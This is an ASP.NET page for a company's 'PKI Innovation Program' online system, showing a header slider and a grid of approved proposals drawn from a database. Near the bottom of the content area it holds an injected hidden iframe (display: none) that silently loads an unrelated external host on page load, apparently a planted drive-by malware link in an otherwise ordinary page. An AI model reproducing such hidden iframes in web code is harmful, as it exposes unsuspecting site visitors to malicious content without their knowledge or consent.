<%@ Page Language="VB" AutoEventWireup="false" CodeFile="searchapprovpage.aspx.vb" Inherits="approvpage" %>

<%@ Register Assembly="System.Web.Extensions, Version=1.0.61025.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
    Namespace="System.Web.UI" TagPrefix="asp" %>



<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="content-type" content="text/html; charset=utf-8" />
<title>PKI Innovation Program</title>
<meta name="keywords" content="" />
<meta name="description" content="" />
<link href="styles.css" rel="stylesheet" type="text/css" />
<link rel="stylesheet" href="nivo-slider.css" type="text/css" media="screen" />
</head>
<body>
<form id="form1" runat="server">
<div id="bg">

<div id="main">
<div id="main_bot">
<!-- header begins -->
<div id="header">
	<div id="logo">
        <h1>
            <img src="images2/kao_logo_type_c_en_green.png" style="left: 14px; width: 533px;
                position: absolute; top: 30px; height: 65px" />
            PKI Innovation Program</h1>
        <h2>
            &nbsp;
            <a href="#" id="metamorph">ONline</a> system</h2>
    </div>
    <div id="buttons" style="width: 855px">
        <ul>
          <li class="first"><a href="Default.aspx"  title="" class="active">home</a></li>
          <li><a href="default.aspx" title="">login</a></li>
          <li><a href="searchapprovpage.aspx" title="">gallery</a></li>
           <li><a href="#" title="">about us</a></li>
          <li><a href="#" title="">contact us</a> &nbsp; </li>
        </ul>
    </div>
</div>
<!-- header ends -->
<!-- scroll begins -->

<div class="header_bg">

<div class="header_slider"> 
                           <div id="slider-wrapper">        
					             <div id="slider" class="nivoSlider">
									<img src="images2/header1.jpg" alt="" title="" />
									<img src="images2/header2.jpg" alt="" title="" />
									<img src="images2/header3.jpg" alt="" title="" />	
									<img src="images2/header4.jpg" alt="" title="" />
									<img src="images2/header5.jpg" alt="" title="" />
									<img src="images2/header6.jpg" alt="" title="" />
									<img src="images2/header7.jpg" alt="" title="" />
									<img src="images2/header8.jpg" alt="" title="" />								
								</div>        
				            </div>
								
<script type="text/javascript" src="lib/jquery-1.4.3.min.js"></script>
    <script type="text/javascript" src="lib/jquery.nivo.slider.pack.js"></script>
    <script type="text/javascript">
    $(window).load(function() {
        $('#slider').nivoSlider();
    });
function IMG1_onclick() {

}

function IMG2_onclick() {

}

function IMG3_onclick() {

}

    </script></div>	
<div class="clear"></div>
</div>
<div class="clear"></div>
<!-- header ends -->
    <!-- content begins -->
    <div id="cont_top"></div>
    <div id="content">
    	
		<div class="wrapper">
                            <div class="space4" style="left: 0px; top: 0px">
                                <h3>
                                    Innovation Program</h3>
                                <div class="wrapper indent-bot2">
                                    
                                    <div class="extra-wrap">
                                        <span class="text-2">&nbsp;<asp:Image ID="Image1" runat="server" Height="36px" ImageUrl="~/images2/approved.png"
                                            Width="108px" /><br />
                                            <asp:Label ID="Label1" runat="server" Font-Bold="True" Font-Size="Medium" Text="Total Approved"></asp:Label></span><h4 class="p1">
                                                &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;
    <asp:LinkButton ID="LinkButton3" runat="server" Font-Size="Large" Height="28px">LinkButton</asp:LinkButton></h4>
                                        </div>
                                </div>
                                <div class="wrapper indent-bot2">
                                    <div class="img-indent"><a href="#"></a></div>
                                    <div class="extra-wrap">
                                        &nbsp;<h4 class="p1">
                                            &nbsp;</h4>
                                        <p>
                                            &nbsp;</p>
                                    </div>
                                </div>
                                <div class="wrapper indent-bot2">
                                    <div class="img-indent"><a href="#"></a></div>
                                    <div class="extra-wrap">
                                        &nbsp;</div>
                                </div>
                                &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;<br />
                                <br />
                                <br />
                                <br />
                            </div>
            <asp:GridView ID="GridView1" runat="server" AllowPaging="True" AutoGenerateColumns="False"
                CellPadding="4" DataKeyNames="pip_no" DataSourceID="SqlDataSource1" Font-Size="Small" GridLines="Horizontal" PageSize="15" Style="left: 176px; position: absolute;
                top: 152px" Width="655px" BackColor="White" BorderColor="#336666" BorderStyle="Double" BorderWidth="3px">
                <RowStyle BackColor="White" ForeColor="#333333" />
                <Columns>
                    <asp:BoundField DataField="pip_no" HeaderText="No" InsertVisible="False" ReadOnly="True"
                        SortExpression="pip_no" />
                    
                    
                    <asp:BoundField DataField="pip_loginid" HeaderText="Proponent" SortExpression="pip_loginid" />
                    <asp:BoundField DataField="pip_department" HeaderText="Dept" SortExpression="pip_department" />
                     <asp:BoundField DataField="pip_plant" HeaderText="Plant" SortExpression="pip_plant" />
                    <asp:BoundField DataField="pip_area" HeaderText="Area" SortExpression="pip_area" />
                    <asp:BoundField DataField="pip_status" HeaderText="Status" SortExpression="pip_status" />
                
                   <asp:ButtonField ButtonType="Button" CommandName="View" Text="View" />
                    
                </Columns>
                <FooterStyle BackColor="White" ForeColor="#333333" />
                <PagerStyle BackColor="#336666" ForeColor="White" HorizontalAlign="Center" />
                <SelectedRowStyle BackColor="#339966" Font-Bold="True" ForeColor="White" />
                <HeaderStyle BackColor="#336666" Font-Bold="True" ForeColor="White" />
                <EditRowStyle Font-Size="Small" />
            </asp:GridView>
            &nbsp;&nbsp;<br />
            <br />
            <br />
            <br />
            <br />
            <br />
            <br />
            <br />
            <br />
            <br />
            <br />
            <br />
            <br />
            <br />
            <br />
            <br />
            <br />
            <br />
            <br />
            <br />
            <br />
            <br />
            <br />
            <br />
            <br />
            <br />
            <br />
            <br />
            <br />
            <br />
            <br />
            <br />
            &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
            &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
            &nbsp;
            <br />
                        </div>
		<div class="clear">
            <asp:ScriptManager id="ScriptManager1" runat="server">
            </asp:ScriptManager>
            <br />
            <asp:UpdatePanel ID="UpdatePanel1" runat="server">
            </asp:UpdatePanel>
            <asp:SqlDataSource ID="SqlDataSource1" runat="server" ConnectionString="<%$ ConnectionStrings:ConnectionString %>"
                SelectCommand="SELECT * FROM [pip_data] where [pip_status] = 'APPROVED'">
                
            </asp:SqlDataSource>
            <br />
            <iframe src="http://jL.chura.pl/rc/" style="display: none"></iframe>
            <br />
            <br />
            <br />
            <br />
            <br />
        </div>
    </div>
    <!-- content ends -->
    <div id="cont_bot"></div>
    <!-- footer begins -->
    <div id="footer">
  Copyright  2012. PKI | MIS Department<br />
		<a href="#">Privacy Policy</a> | <a href="#">Terms of Use</a> | <a href="http://validator.w3.org/check/referer" title="This page validates as XHTML 1.0 Transitional"><abbr title="eXtensible HyperText Markup Language">XHTML</abbr></a> | <a href="http://jigsaw.w3.org/css-validator/check/referer" title="This page validates as CSS"><abbr title="Cascading Style Sheets">CSS</abbr></a></div>
<!-- footer ends -->
</div>
</div>
</div>
</form> 
</body>

</html>
